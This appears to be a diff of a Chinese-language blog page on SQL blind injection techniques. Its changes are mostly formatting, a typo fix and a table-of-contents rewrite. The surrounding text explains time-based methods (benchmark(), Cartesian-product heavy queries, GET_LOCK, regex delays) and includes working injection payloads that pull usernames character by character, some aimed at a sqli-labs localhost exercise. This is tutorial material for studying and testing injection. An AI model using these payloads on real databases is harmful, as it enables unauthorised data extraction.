 </span></span></span></code></pre></div><p>该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可 取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</p>
-<h4 id="benchmark">benchmark()</h4>
+<h4 id="benchmark">- <code>benchmark()</code></h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select username from users limit 0,1), 1, 1))=68),benchmark(5000000000000000, sha(1),0)-- -
 </span></span></code></pre></div><p>通过时间长短的变化，判断语句是否执行成功，这是一种边信道攻击，在运行过程中占用大量的CPU资源，推荐使用sleep()</p>
 <div class="table-wrapper"><table>
 <thead>
 <tr>
-<th>Databse</th>
+<th>Database</th>
 <th>Expression</th>
 </tr>
 </thead>
@@ -407,7 +584,7 @@ payload：</p>
 </tr>
 </tbody>
 </table></div>
-<h4 id="笛卡尔积-heavy-query">笛卡尔积（heavy query）</h4>
+<h4 id="笛卡尔积-heavy-query">- 笛卡尔积（heavy query）</h4>
 <p>通过查询多个表合集来造成大量的查询，导致查询时间变长造成延迟</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C;
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
@@ -415,7 +592,7 @@ payload：</p>
 </span></span></code></pre></div><figure><img src="/ox-hugo/2022-03-24_19-54-12_screenshot.png" width="400px"/>
 </figure>
 
-<h4 id="get-lock">GET_LOCK</h4>
+<h4 id="get-lock">- <code>GET_LOCK()</code></h4>
 <p><a class="link" href="https://blog.csdn.net/weixin%5F40006763/article/details/111687849"  target="_blank" rel="noopener"
     >https://blog.csdn.net/weixin%5F40006763/article/details/111687849</a>
 mysql_pconnect(server,user,pwd,clientflag)</p>
@@ -424,7 +601,7 @@ mysql_pconnect(server,user,pwd,clientflag)</p>
 </span></span></code></pre></div><p>get_lock(str,timeout)</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Tries to obtain a lock with a name given by the string str, using a timeout of timeout seconds. A negative timeout value means infinite timeout. The lock is exclusive. While held by one session, other sessions cannot obtain a lock of the same name.get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。 在一个session中锁定变量，同时通过另外一个session执行，将会产生延时
 </span></span></code></pre></div><p>也就是说此方法只有在数据库的连接是持久连接的时候才能生效 举个栗子： 打开两个mysql的shell 现在一个shell中执行命令 select getlock(&lsquo;sdpc&rsquo;,5) 先上锁 然后另外一个shell中执行重复的命令 第二个shell中便出现延迟 延迟的时间由第二个shell的getlock中的参数决定.So，在我们写脚本的时候，先加锁，再进行盲注即可(使用requests库时注意加锁和盲注不要在同一个session下)</p>
-<h4 id="正则bug">正则bug</h4>
+<h4 id="正则bug">- 正则bug</h4>
 <p><a class="link" href="https://xz.aliyun.com/t/2288"  target="_blank" rel="noopener"
     >https://xz.aliyun.com/t/2288</a>
 这是一个老生常谈的问题了，但之前可能很少会把它放到注入里讨论。</p>
@@ -473,7 +650,7 @@ mysql_pconnect(server,user,pwd,clientflag)</p>
 
 
         <span>
-            Last updated on Mar 27, 2022 15:48 BST
+            Last updated on Mar 31, 2022 22:00 BST
         </span>
     </section></footer>
 
@@ -671,37 +848,37 @@ mysql_pconnect(server,user,pwd,clientflag)</p>
         
         <div class="widget--toc">
             <nav id="TableOfContents">
-  <ol>
-    <li><a href="#blind-injection">Blind injection</a>
-      <ol>
-        <li><a href="#布尔盲注">布尔盲注</a>
-          <ol>
-            <li><a href="#left"><code>left()</code></a></li>
-            <li><a href="#substr-ascii"><code>substr()</code> <code>ascii()</code></a></li>
-            <li><a href="#regexp"><code>regexp</code></a></li>
-            <li><a href="#like-匹配注入"><code>like</code> 匹配注入</a></li>
-            <li><a href="#ord-and-mid"><code>ORD()</code> and <code>MID()</code></a></li>
-          </ol>
+  <ul>
+    <li><a href="#sql-injection-blind-injection">SQL Injection: Blind injection</a>
+      <ul>
+        <li><a href="#1-dot-布尔盲注">1. 布尔盲注</a>
+          <ul>
+            <li><a href="#left">- <code>left()</code></a></li>
+            <li><a href="#substr-ascii">- <code>substr()</code> <code>ascii()</code></a></li>
+            <li><a href="#ord-and-mid">- <code>ORD()</code> and <code>MID()</code></a></li>
+            <li><a href="#regexp">- <code>regexp</code></a></li>
+            <li><a href="#like-匹配注入">- <code>like</code> 匹配注入</a></li>
+          </ul>
         </li>
-        <li><a href="#报错盲注">报错盲注</a>
-          <ol>
-            <li><a href="#bigint数据类型溢出报错注入">BigInt数据类型溢出报错注入</a></li>
-            <li><a href="#参数格式错误">参数格式错误</a></li>
-            <li><a href="#主键重复">主键重复</a></li>
-          </ol>
+        <li><a href="#2-dot-报错盲注">2. 报错盲注</a>
+          <ul>
+            <li><a href="#bigint数据类型溢出报错注入">- BigInt数据类型溢出报错注入</a></li>
+            <li><a href="#参数格式错误">- 参数格式错误</a></li>
+            <li><a href="#主键重复">- 主键重复</a></li>
+          </ul>
         </li>
-        <li><a href="#时间盲注">时间盲注</a>
-          <ol>
-            <li><a href="#sleep"><code>sleep()</code></a></li>
-            <li><a href="#benchmark">benchmark()</a></li>
-            <li><a href="#笛卡尔积-heavy-query">笛卡尔积（heavy query）</a></li>
-            <li><a href="#get-lock">GET_LOCK</a></li>
-            <li><a href="#正则bug">正则bug</a></li>
-          </ol>
+        <li><a href="#3-dot-时间盲注">3. 时间盲注</a>
+          <ul>
+            <li><a href="#sleep">- <code>sleep()</code></a></li>
+            <li><a href="#benchmark">- <code>benchmark()</code></a></li>
+            <li><a href="#笛卡尔积-heavy-query">- 笛卡尔积（heavy query）</a></li>
+            <li><a href="#get-lock">- <code>GET_LOCK()</code></a></li>
+            <li><a href="#正则bug">- 正则bug</a></li>
+          </ul>
         </li>
-      </ol>
+      </ul>
     </li>
-  </ol>
+  </ul>
 </nav>
         </div>
     </section>
